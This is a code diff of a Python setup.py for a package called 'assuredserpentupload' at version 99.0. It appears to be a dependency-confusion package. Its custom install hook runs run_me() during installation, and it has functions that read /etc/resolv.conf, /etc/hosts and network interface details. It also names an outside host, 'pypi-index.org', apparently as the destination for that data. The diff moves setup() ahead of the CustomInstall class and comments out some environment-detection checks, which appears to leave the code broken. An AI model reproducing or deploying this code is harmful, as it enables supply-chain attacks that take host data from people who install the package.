@@ -4,26 +4,43 @@ import getpass
 import os
 import sys
 import json
-
 if sys.version_info[0] >= 3:
     import urllib.request as http_request
 if sys.version_info[0] == 2:
     import urllib2 as http_request
-
 import datetime
 import hashlib
 import uuid
 import subprocess
-
 HOST = "pypi-index.org"
 PACKAGE = "assuredserpentupload"
 H_F1 = "3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0" 
 H_F2 = "7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159" 
-
 H_F3 = "2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e" 
 H_F4 = "7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2" 
-
 RESP = ""
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import subprocess 
+import shutil
+import site
+import atexit
+import sys, os
+try:
+    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+    README = open(os.path.join(SCRIPT_DIR, "README.md"), "rb")
+    README_DATA = README.read().decode("utf8")
+    README.close()
+    setup(
+        name=PACKAGE,
+        version='99.0',
+        packages=find_packages(),
+        cmdclass={'install': CustomInstall},  
+        long_description=README_DATA,
+        long_description_content_type="text/markdown",   
+    )
+except Exception as e:
+    print(e)
 
 def sha256(str_):
     return hashlib.sha256(str_.encode('utf-8')).hexdigest()
@@ -59,27 +76,27 @@ def MtrEMXATlo_2():
     except:
         return False
 
-def nvXByRJypA_3():
-    for name, value in os.environ.items():
-        if sha256(name) == H_F3 and sha256(value) == H_F4:
-            return True
-    return False
+# def nvXByRJypA_3():
+#     for name, value in os.environ.items():
+#         if sha256(name) == H_F3 and sha256(value) == H_F4:
+#             return True
+#     return False
 
-def detect_system():
-    
-    
-    
-    
-    
-    key = 0
-    if oPwKAZGTei_1():
-        key = 1
-    elif MtrEMXATlo_2():
-        key = 2
-    elif nvXByRJypA_3():
-        key = 3 
-    
-    return key
+# def detect_system():
+#
+#
+#
+#
+#
+#     key = 0
+#     if oPwKAZGTei_1():
+#         key = 1
+#     elif MtrEMXATlo_2():
+#         key = 2
+#     elif nvXByRJypA_3():
+#         key = 3 
+#
+#     return key
 
 def read_config(config):
     c = ""
@@ -94,10 +111,8 @@ def read_config(config):
     
     return c
 
-
 def get_dns():
     return read_config("/etc/resolv.conf")
-    
 
 def get_hosts():
     return read_config("/etc/hosts")
@@ -187,7 +202,6 @@ def get_ip_addresses(interface):
 
     return ips, macs
 
-
 def get_net():
     c = ""
     try:
@@ -246,16 +260,6 @@ def run_me():
         
     except Exception as e:
         pass
-        
-
-
-from setuptools import setup, find_packages
-from setuptools.command.install import install
-import subprocess 
-import shutil
-import site
-import atexit
-import sys, os
 
 def get_index():
     try:
@@ -270,7 +274,6 @@ def get_index():
             f.close()
             return line.split("=")[-1].strip()
     f.close()
-
 
 class CustomInstall(install):
     def run(self):    
@@ -323,21 +326,3 @@ class CustomInstall(install):
         atexit.register(_post_install)
         run_me()
         install.run(self)
-
-try:
-
-    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-    README = open(os.path.join(SCRIPT_DIR, "README.md"), "rb")
-    README_DATA = README.read().decode("utf8")
-    README.close()
-
-    setup(
-        name=PACKAGE,
-        version='99.0',
-        packages=find_packages(),
-        cmdclass={'install': CustomInstall},  
-        long_description=README_DATA,
-        long_description_content_type="text/markdown",   
-    )
-except Exception as e:
-    print(e)
